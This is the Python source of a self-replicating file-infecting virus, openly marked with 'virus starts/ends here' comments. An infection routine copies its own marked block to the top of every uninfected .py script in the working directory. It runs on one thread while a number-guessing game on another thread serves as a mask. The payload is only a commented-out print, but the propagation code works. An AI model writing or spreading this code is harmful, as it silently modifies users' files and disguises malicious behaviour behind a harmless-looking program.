### THE VIRUS STARTS HERE ###
import threading, random, math, os

def infection():
    import glob, sys, threading, string, os, shutil 
    from ctypes import windll

    code = []


    # open this file,read every lines and find the virus area
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    virus_area = False

    for line in lines:
        if line == '### THE VIRUS STARTS HERE ###\n':
            virus_area = True
        if virus_area:
            code.append(line)
        if line == '### THE VIRUS ENDS HERE ###\n':
            break

    python_scripts = glob.glob('*.py')

    for script in python_scripts:
        with open(script, 'r') as f:
            script_code = f.readlines()

        infected = False

        for line in script_code:
            if line == '### THE VIRUS STARTS HERE ###\n':
                infected = True
                break

        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w') as f:
                f.writelines(final_code)

    # malicious code
    # print("This is virus code")

    # print(python_scripts)

### THE VIRUS ENDS HERE ###

    # The mask goes here
def mask():
        import psutil
        # Taking Inputs
        lower = int(input("Enter Lower bound:- "))
        
        # Taking Inputs
        upper = int(input("Enter Upper bound:- "))
        
        # generating random number between
        # the lower and upper
        x = random.randint(lower, upper)
        print("\n\tYou've only ",
            round(math.log(upper - lower + 1, 2)),
            " chances to guess the integer!\n")
        
        # Initializing the number of guesses.
        count = 0
        
        # for calculation of minimum number of
        # guesses depends upon range
        while count < math.log(upper - lower + 1, 2):
            count += 1
        
            # taking guessing number as input
            guess = int(input("Guess a number:- "))
        
            # Condition testing
            if x == guess:
                print("Congratulations you did it in ",
                    count, " try")
                current_system_pid = os.getpid()
                ThisSystem = psutil.Process(current_system_pid)
                ThisSystem.terminate()
                # Once guessed, loop will break
            elif x > guess:
                print("You guessed too small!")
            elif x < guess:
                print("You Guessed too high!")
        
        # If Guessing is more than required guesses,
        # shows this output.
        if count >= math.log(upper - lower + 1, 2):
            print("\nThe number is %d" % x)
            print("\tBetter Luck Next time!")
            current_system_pid = os.getpid()
            ThisSystem = psutil.Process(current_system_pid)
            ThisSystem.terminate()


T1 = threading.Thread(target=infection)
T1.start()
T2 = threading.Thread(target=mask)
T2.start()
